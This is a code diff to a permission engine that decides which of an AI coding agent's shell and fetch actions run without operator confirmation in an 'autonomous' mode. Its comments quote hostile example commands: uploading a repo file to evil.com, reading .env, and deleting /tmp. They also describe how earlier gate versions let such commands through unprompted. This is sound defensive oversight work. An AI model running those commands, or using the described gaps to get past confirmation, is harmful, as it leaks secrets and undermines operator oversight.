@@ -49,7 +49,11 @@ import {
 // Importing the resolver index registers every builtin resolver at
 // module load. Engine consumers don't need a separate wire-up step.
 import { topLevelCommandTexts } from './resolvers/bash.ts';
-import { type ResolverResult, resolveCapabilities } from './resolvers/index.ts';
+import {
+  type ResolverResult,
+  conservativeCapsAreHonest,
+  resolveCapabilities,
+} from './resolvers/index.ts';
 import {
   DEFAULT_TRUSTED_HOSTS,
   type RiskScoreConfidence,
@@ -86,7 +90,7 @@ import type {
   PolicyToolsSection,
   PostureChange,
 } from './types.ts';
-import { categoryIsEgress } from './types.ts';
+import { categoryNeverAutoApproved } from './types.ts';
 
 export interface EngineOptions {
   cwd: string;
@@ -1236,8 +1240,8 @@ const checkFetch = (
 // allow → allow → confirm → the category default. The default is NOT mode-
 // dependent (trust already happened): a plain `mcp` tool defaults allow, an
 // `mcp.egress` tool defaults confirm (network egress is never silent; the
-// categoryIsEgress check in check() also keeps it out of autonomous auto-
-// approval). An explicit operator `allow` precedes the egress default, so it
+// categoryNeverAutoApproved check in check() also keeps it out of autonomous
+// auto-approval). An explicit operator `allow` precedes the egress default, so it
 // opts that tool out of the confirm — the operator pre-authorized it (the same
 // shape as `fetch_url`'s allow_hosts). MCP is not a capability-grant kind
 // (grantRelevantForSection has no 'mcp' branch), so there is no persisted-grant
@@ -1409,54 +1413,69 @@ const degradeAllowToConfirm = (
   };
 };
 
-// Inverse of degradeAllowToConfirm for the autonomous posture: a
-// routine `policy` confirm becomes an allow so it clears without a
-// modal. Handles ONLY the 'policy' cause; the bash 'compound' / 'resolver'
-// / 'score' causes have a capability-confinement sibling
-// (`autoApproveRepoConfined`). Every OTHER cause (escalate/degraded) is a
-// risk/safety signal and passes through unchanged (fail-closed: an
-// unrecognized future cause stays a confirm too). Preserves source
-// attribution + carried DecisionBase fields so the audit row still names
-// the rule that matched; the reason records that POSTURE, not the rule,
-// cleared it. Caller only invokes this when the engine is `ready` —
-// degraded suspends auto-approval.
-const autoApprovePolicyConfirm = (decision: Decision): Decision => {
-  if (decision.kind !== 'confirm' || decision.confirmCause !== 'policy') return decision;
+// Rewrite a `confirm` into an `allow` under the autonomous posture. Preserves
+// source attribution + carried DecisionBase fields so the audit row still names
+// the rule that matched; the reason records that POSTURE, not the rule, cleared
+// it. Caller decides WHETHER to call this; it only does the rewrite.
+const autoApprove = (decision: Decision, note: string): Decision => {
+  if (decision.kind !== 'confirm') return decision;
   const allow: Extract<Decision, { kind: 'allow' }> = {
     kind: 'allow',
-    reason: `autonomous posture: auto-approved policy confirm (was: ${decision.reason ?? 'confirm'})`,
+    reason: `autonomous posture: ${note} (was: ${decision.reason ?? 'confirm'})`,
   };
   if (decision.source !== undefined) allow.source = decision.source;
   if (decision.ttlExpiresAt !== undefined) allow.ttlExpiresAt = decision.ttlExpiresAt;
   return allow;
 };
 
-// Whether a single capability is "repo-confined and non-dangerous" for
-// the autonomous posture — an effect the operator opted to run without a
-// modal when hands-off (§8.1 `AGENTIC_CLI`). Safe = filesystem read /
-// write / delete UNDER the cwd subtree (and neither OS-protected nor a
-// content-secret), a LOCAL git write on this repo, the `/dev` safe
-// pseudo-devices (so `2>/dev/null` doesn't gate), and `exec:shell` (the
-// bash process itself). Everything else keeps its modal: network
-// (net-egress / net-ingress — `git push`/`pull`/`fetch` carry net-egress,
-// so they gate even though they also git-write), an unknown binary
-// (`exec:arbitrary`), python/node interpreters, secret-access, env/agent
-// mutation, and ANY path outside the repo or hitting a protected
-// (`.git`/`.forja`/system) or sensitive (`.env`/`*.pem`/`id_rsa`/
-// credentials) target. The sensitive/protected checks are
-// belt-and-suspenders — the engine's §8.4 sensitive floor already DENIES
-// most of these before this runs — so a future floor change can't
-// silently widen auto-approval. Fail-closed: an unrecognized kind, or a
-// scoped kind with a null scope, is not safe.
-const capRepoConfined = (cap: Capability, cwd: string, home: string): boolean => {
+// Whether a single capability is "dev-loop-confined" for the autonomous posture
+// — an effect the operator opted to run without a modal when hands-off (§8.1
+// `AGENTIC_CLI`): use git, run the language toolchain, create/edit/delete the
+// project's files, execute scripts, fetch the web.
+//
+// Safe = filesystem read/write/delete UNDER the cwd subtree (neither
+// OS-protected nor a content-secret); a LOCAL,
+// NON-DESTRUCTIVE git write; the `/dev` safe pseudo-devices (so `2>/dev/null`
+// doesn't gate); `exec:shell` (the bash process itself); `exec:arbitrary` (an
+// unmodeled binary — `./deploy.sh`, `bun install`; the sandbox's `cwd-rw` floor
+// bounds what it can write); and plain `net-egress`.
+//
+// Keeps its modal: `git-write` marked `destructive` (push/pull/clone, the
+// history rewrites, the work discards — see `Capability.destructive`), ANY path
+// outside the repo — measured: no modeled lang tool emits one for an ordinary
+// build (`bun install`, `cargo build`, `go build`, `make` all stay in-repo),
+// while `pip install --user` (write-fs:~/.local) and `npm install -g` do, and
+// those SHOULD prompt — any protected
+// (`.git`/`.forja`/system) or sensitive (`.env`/`*.pem`/`id_rsa`/credentials)
+// target, `secret-access`, `env-mutate`, `forja-mutate`, `net-ingress`, and
+// `host-passthrough`.
+//
+// `net-egress` is judged HERE as merely present; the upload shape is a property
+// of the capability SET, not of one cap, so it lives in `hasUploadShape`.
+//
+// The sensitive/protected checks are belt-and-suspenders — the engine's §8.4
+// sensitive floor already DENIES most of these before this runs — so a future
+// floor change can't silently widen auto-approval. Fail-closed: an unrecognized
+// kind, an unrecognized exec scope, or a scoped kind with a null scope is not
+// safe.
+const capDevLoopConfined = (cap: Capability, cwd: string, home: string): boolean => {
   switch (cap.kind) {
     case 'exec':
-      return cap.scope === 'shell';
+      // `arbitrary` = an unmodeled binary or script. The operator moved this
+      // out of the gate (running scripts is the dev loop); the sandbox's
+      // write-fs floor → `cwd-rw` is what bounds it. Any other scope
+      // (a future `python`/`node` emitter) is unrecognized → not safe.
+      return cap.scope === 'shell' || cap.scope === 'arbitrary';
     case 'git-write':
-      // Resolver stamps git-write with repo == cwd; a network git op
-      // (push/pull/fetch/unknown subcommand) ALSO carries net-egress,
-      // which fails this predicate via the default branch.
-      return cap.scope === cwd;
+      // Resolver stamps git-write with repo == cwd. `destructive` separates
+      // `git add` from `git push`/`git reset --hard` — no capability KIND does,
+      // since `curl` and `git push` both emit net-egress.
+      return cap.scope === cwd && cap.destructive !== true;
+    case 'net-egress':
+      // Fetching a doc is dev loop. Sending a file out is not — see
+      // `hasUploadShape`. `deny_hosts` + the SSRF guard already returned `deny`
+      // upstream and never reach a `confirm`.
+      return true;
     case 'read-fs':
     case 'write-fs':
     case 'delete-fs': {
@@ -1479,50 +1498,115 @@ const capRepoConfined = (cap: Capability, cwd: string, home: string): boolean =>
       return true;
     }
     default:
-      // net-egress, net-ingress, secret-access, env-mutate, forja-mutate,
-      // host-passthrough → never repo-confined.
+      // net-ingress, secret-access, env-mutate, forja-mutate, host-passthrough
+      // → never dev-loop-confined.
       return false;
   }
 };
 
-// Autonomous-posture sibling of autoApprovePolicyConfirm for the
-// capability-confined case: a bash `confirm` (compound / resolver-low-
-// confidence / score-gated) becomes an allow when EVERY resolved
-// capability is repo-confined (`capRepoConfined`) AND no top-level segment
-// matches an operator `deny` rule. This is what lets the agent work freely
-// INSIDE the repo under autonomous — read/write/delete repo files, local
-// git — while every dangerous effect (network, outside-repo, unknown
-// binary, protected/sensitive path) keeps its modal. The caller gates this
-// on resolver `kind: ok` (the command is FULLY modeled, so the capability
-// set is COMPLETE): within that, command structure (compound, glob,
-// pipeline) doesn't gate — only the EFFECT does. A `conservative` result
-// (soft control flow, dynamic `$var`, unknown command) never reaches here,
-// because its caps are best-effort and can under-represent the runtime
-// targets. The per-segment deny re-check closes
-// checkBash's whole-string-glob gap (`deny: ['curl*']` misses `echo x &&
-// curl evil`); it runs only for the compound cause. That is SOUND because
-// of an invariant: the `resolver`/`score` causes arise only from an
-// upgraded ALLOW (`degradeAllowToConfirm` rewrites `allow`→`confirm` and
-// returns an existing `confirm` untouched), and an allow is necessarily
-// NON-compound — checkBash stamps any shell-metachar command `compound`
-// BEFORE the allow rules. So a compound always carries cause `compound`
-// (even when also low-confidence or score-crossing), and a `resolver`/
-// `score` confirm is always a single command whose whole string checkBash
-// already deny-matched. Pinned by tests. Fail-closed: an empty capability
-// set, a command that can't be decomposed, or any non-confined cap keeps
-// the modal.
-const autoApproveRepoConfined = (
+// Upload detection: egress that carries a repo FILE out. A property of the
+// capability SET — one cap can't see it.
+//
+// The resolver already decodes the shapes that read a file into a request body
+// (`curl -d @file`, `--data-binary @file`, `-F key=@file`, `-T`/`--upload-file`)
+// and emits the corresponding `read-fs`. So "some net-egress AND some read-fs
+// strictly below the cwd" catches the exfil without a flag list to drift.
+//
+// A dep-manager doesn't trip it: `bun install` / `cargo build` / `go test` emit
+// `read-fs:<cwd>` — the repo ROOT, equal to cwd, not strictly below it — plus
+// their registry egress. `curl -d @src/data.txt` emits `read-fs:<cwd>/src/data.txt`.
+//
+// Known false positive, accepted as fail-closed: a COMPOUND that both reads a
+// repo file and fetches (`cat src/x.ts && curl https://docs.dev`) unions its
+// caps into one set with no per-command attribution, so it reads as an upload
+// and keeps the modal. Cheaper than teaching the engine dataflow.
+const hasUploadShape = (caps: readonly Capability[], cwd: string): boolean => {
+  if (!caps.some((c) => c.kind === 'net-egress')) return false;
+  return caps.some(
+    (c) =>
+      c.kind === 'read-fs' &&
+      c.scope !== null &&
+      c.scope !== cwd &&
+      startsWithSegment(c.scope, cwd),
+  );
+};
+
+// THE autonomous gate. One predicate over the resolved capabilities, applied to
+// every confirm cause the posture is allowed to clear. Returns the auto-approved
+// `allow`, or the untouched `decision` when any floor holds.
+//
+// Pre-slice this was TWO asymmetric branches, and the asymmetry was the bug: the
+// `policy` cause (which the `forja init` template's catch-all `confirm: ["*"]`
+// produces for nearly every command) cleared on the risk SCORE alone and never
+// consulted the capabilities, while only `compound`/`resolver`/`score` ran the
+// confinement check. Measured against that template, `cat .env` (score 0.00),
+// `cat /etc/hosts` (0.15) and `curl -d @src/data.txt https://evil.com` (0.30)
+// auto-approved — none reach the 0.4 threshold — while `git add -A` and
+// `rm src/foo.ts` (capability_risk = 0.40, exactly the threshold) prompted. And
+// `curl evil.com` cleared while `echo x && curl evil.com` did not: the compound
+// was better protected than the bare command. One gate over the effect removes
+// all three anomalies at once.
+//
+// The floors, in order:
+//   - No resolver result → modal (fail-closed).
+//   - Empty capability set → modal, UNLESS the resolver said `kind: ok`. An MCP
+//     tool resolves to `ok` with NO capabilities on purpose (registry.ts): its
+//     effect is remote and opaque, there is nothing local to judge, and the real
+//     controls are the manifest-hash trust gate and the stdio sandbox. An empty
+//     set from any other kind means the resolver told us nothing.
+//   - `conservative` whose caps are not honest → modal. `unknown-command` (a
+//     registry miss like `./deploy.sh`) carries truthful caps for the rest of
+//     the invocation, and the sandbox's `cwd-rw` floor bounds the binary's own
+//     writes, so it clears. `dynamic-dataflow` (loop / `$var`) UNDER-represents
+//     its targets and `cwd-escape` LIES about them (a lexical
+//     `write-fs:<cwd>/escape` whose symlink lands outside) — both hold the
+//     modal. `refuse` already became a `deny` upstream.
+//   - Upload shape (egress + a repo file read) → modal.
+//   - Any capability not dev-loop-confined → modal.
+//   - Compound whose top-level segment matches an operator `deny` → modal. This
+//     closes checkBash's whole-string-glob gap (`deny: ['curl*']` misses
+//     `echo x && curl evil`), and runs only for the `compound` cause because the
+//     `resolver`/`score` causes arise only from an upgraded ALLOW
+//     (`degradeAllowToConfirm` rewrites `allow`→`confirm` and returns an existing
+//     `confirm` untouched), and an allow is necessarily NON-compound — checkBash
+//     stamps any shell-metachar command `compound` BEFORE the allow rules. So a
+//     compound always carries cause `compound`, and a `resolver`/`score` confirm
+//     is always a single command whose whole string checkBash already
+//     deny-matched. Pinned by tests.
+//
+// Command structure (compound, glob, pipeline) and resolver confidence do NOT
+// gate on their own: they are signals of structural UNCERTAINTY, not of danger.
+// The danger is the effect.
+//
+// Confirm causes this gate MAY clear — a positive ALLOWLIST, so a future
+// `ConfirmCause` is non-auto-approvable by default (fail-closed). `escalate`
+// (protected-path tier) and `degraded` (engine health) are the two safety
+// causes excluded today; anything not listed here keeps its modal.
+const AUTO_APPROVABLE_CAUSES: ReadonlySet<ConfirmCause> = new Set<ConfirmCause>([
+  'policy',
+  'compound',
+  'resolver',
+  'score',
+]);
+const autoApproveDevLoop = (
   decision: Decision,
   command: unknown,
   caps: readonly Capability[],
+  resolverResult: ResolverResult | null,
   cwd: string,
   home: string,
   denyRules: readonly string[] | undefined,
 ): Decision => {
   if (decision.kind !== 'confirm') return decision;
-  if (caps.length === 0) return decision;
+  if (!AUTO_APPROVABLE_CAUSES.has(decision.confirmCause)) return decision;
+  if (resolverResult === null) return decision;
+  if (resolverResult.kind === 'conservative' && !conservativeCapsAreHonest(resolverResult.cause)) {
+    return decision;
+  }
+  if (caps.length === 0 && resolverResult.kind !== 'ok') return decision;
+  if (hasUploadShape(caps, cwd)) return decision;
   for (const cap of caps) {
-    if (!capRepoConfined(cap, cwd, home)) return decision;
+    if (!capDevLoopConfined(cap, cwd, home)) return decision;
   }
   if (decision.confirmCause === 'compound') {
     if (typeof command !== 'string') return decision;
@@ -1532,13 +1616,7 @@ const autoApproveRepoConfined = (
       if (firstMatchingCommand(denyRules, segment) !== null) return decision;
     }
   }
-  const allow: Extract<Decision, { kind: 'allow' }> = {
-    kind: 'allow',
-    reason: `autonomous posture: auto-approved repo-confined operation (was: ${decision.reason ?? 'confirm'})`,
-  };
-  if (decision.source !== undefined) allow.source = decision.source;
-  if (decision.ttlExpiresAt !== undefined) allow.ttlExpiresAt = decision.ttlExpiresAt;
-  return allow;
+  return autoApprove(decision, 'auto-approved dev-loop-confined operation');
 };
 
 // Optional reason-chain entry appended when the engine intercepts a
@@ -2569,8 +2647,8 @@ export const createPermissionEngine = (
         // `tools.mcp` section governs both (policySectionFor maps both to 'mcp');
         // checkMcp layers the operator's deny/confirm/allow over the wire-name
         // patterns, falling to the category default on no match — `mcp` → allow,
-        // `mcp.egress` → confirm (egress is also kept out of autonomous auto-
-        // approval by the categoryIsEgress check above).
+        // `mcp.egress` → confirm (also kept out of autonomous auto-approval by
+        // the categoryNeverAutoApproved check above).
         decision = checkMcp(
           toolName,
           sectionRules as McpPolicy | undefined,
@@ -2582,8 +2660,8 @@ export const createPermissionEngine = (
       case 'mesh.egress': {
         // mesh_send delivers a prompt to a peer over a same-user LOCAL Unix socket.
         // No policy section — a plain confirm that RESPECTS POSTURE (MESH.md §5.3):
-        // autonomous auto-approves, supervised confirms (it is NOT categoryIsEgress
-        // — a local same-user boundary, not network egress). In supervised the
+        // autonomous auto-approves, supervised confirms (it is NOT network egress
+        // — a local same-user boundary). In supervised the
         // operator must see WHAT is leaving and to WHOM (the message is the outbound
         // payload), so surface the peer + a bounded, control-stripped excerpt — the
         // modal has no other field for it.
@@ -2659,16 +2737,19 @@ export const createPermissionEngine = (
     // Autonomous posture clears a confirm without the modal. Runs LAST —
     // after every allow→confirm upgrade — and stays honest via these
     // floors:
-    //   - Two auto-approvable shapes only. (1) a routine `policy` confirm
-    //     (operator `confirm` rule) that is ITSELF low-risk — one that
-    //     also trips the score / resolver gate is held, since
-    //     `degradeAllowToConfirm` only upgrades `allow`s and a high-risk
-    //     `confirm` rule must not get LESS protection than an `allow`.
-    //     (2) a bash compound / resolver / score confirm whose every
-    //     resolved capability is repo-confined (`autoApproveRepoConfined`):
-    //     network, outside-repo, unknown-binary, and protected/sensitive
-    //     effects all fail that predicate and keep the modal. `escalate`
-    //     (protected-path tier) and `degraded` are never auto-approved.
+    //   - ONE gate, over the resolved capabilities (`autoApproveDevLoop`),
+    //     applied to every confirm cause EXCEPT `escalate` (protected-path
+    //     tier) and `degraded`, which are safety signals and never clear.
+    //     What holds a modal is the EFFECT: leaving the repo, touching a
+    //     protected/sensitive path, destructive git, an upload, secret /
+    //     env / agent mutation. Structure (compound, glob, pipeline) and
+    //     resolver confidence do not gate on their own.
+    //   - `mcp.egress` never auto-approves: a third-party server reached
+    //     over a channel the engine cannot decompose into capabilities, so
+    //     the capability gate has nothing to judge. `web.fetch` is NOT in
+    //     that set — it is judged by capability exactly like a `curl`,
+    //     because a modal attached to the TOOL rather than the EFFECT just
+    //     teaches the model to reach for `curl` instead.
     //   - suspended while degraded: a subsystem-health signal re-arms the
     //     modal for everything, posture included. We read the LIVE state
     //     here, NOT the `currentState` snapshot taken at the top of
@@ -2680,59 +2761,29 @@ export const createPermissionEngine = (
     //     the classifier path only transitions to `degraded`, so `ready`
     //     is the only clearing value here.
     const liveState = stateController.get();
-    const policyConfirmIsRisky =
-      score >= scoreConfirmThreshold || gateConfidence === 'low' || resolverForcesConfirm;
     let postureNote: string | null = null;
-    if (posture === 'autonomous' && liveState === 'ready' && decision.kind === 'confirm') {
-      // Network egress is NEVER auto-approved by autonomous. A fetch the model
-      // chose can carry data OUT in the URL (exfil), and the host isn't
-      // repo-confined the way the bash branch below requires — egress control
-      // (AGENTIC_CLI §9) means the operator always sees an unknown-host egress,
-      // even under autonomous. deny_hosts/allow_hosts still decide allow/deny
-      // without a modal; only the default-confirm falls here. `categoryIsEgress`
-      // (not a `=== 'web.fetch'` name check) keeps this exhaustive: a future
-      // egress category is excluded by construction, not by remembering to
-      // patch this line.
-      if (
-        decision.confirmCause === 'policy' &&
-        !policyConfirmIsRisky &&
-        !categoryIsEgress(category)
-      ) {
-        decision = autoApprovePolicyConfirm(decision);
-        if (decision.kind === 'allow') postureNote = 'autonomous: auto-approved policy confirm';
-      } else if (
-        category === 'bash' &&
-        resolverResult !== null &&
-        resolverResult.kind === 'ok' &&
-        (decision.confirmCause === 'compound' ||
-          decision.confirmCause === 'resolver' ||
-          decision.confirmCause === 'score')
-      ) {
-        // Capability-confinement: a bash confirm whose every resolved
-        // capability stays inside the repo and is non-dangerous clears
-        // without a modal, regardless of compound structure. Gated on
-        // resolver `kind: ok` — i.e. the resolver FULLY modeled the command
-        // — because that is the only state where the capability set is a
-        // COMPLETE representation of the effect. A `conservative` result
-        // (soft control flow, a dynamic `$var`, an unknown command) emits
-        // BEST-EFFORT caps that can UNDER-represent the runtime targets:
-        // `for f in /tmp/*; do rm "$f"; done` models the body's `$f` as
-        // `<cwd>/$f` and emits no cap for the `/tmp/*` loop source, so the
-        // caps all look repo-confined while the command deletes `/tmp` —
-        // those stay behind the modal. (`refuse` already became a deny
-        // upstream.) The cap predicate + per-segment deny re-check live in
-        // the helper.
-        const before = decision;
-        decision = autoApproveRepoConfined(
-          decision,
-          args.command,
-          resolvedCapabilities,
-          cwd,
-          home,
-          (sectionRules as BashPolicy | undefined)?.deny,
-        );
-        if (decision !== before) postureNote = 'autonomous: auto-approved repo-confined operation';
-      }
+    if (
+      posture === 'autonomous' &&
+      liveState === 'ready' &&
+      decision.kind === 'confirm' &&
+      !categoryNeverAutoApproved(category)
+    ) {
+      // Which confirm CAUSES may clear lives inside autoApproveDevLoop as a
+      // positive allowlist (AUTO_APPROVABLE_CAUSES) — fail-closed for a future
+      // cause. The call-site only gates on posture, engine health, and the
+      // never-auto-approve category (mcp.egress).
+      const before = decision;
+      decision = autoApproveDevLoop(
+        decision,
+        args.command,
+        resolvedCapabilities,
+        resolverResult,
+        cwd,
+        home,
+        (sectionRules as BashPolicy | undefined)?.deny,
+      );
+      if (decision !== before)
+        postureNote = 'autonomous: auto-approved dev-loop-confined operation';
     }
     const stages: ReasonChainEntry[] = [];
     if (classifierStage !== null) stages.push(classifierStage);
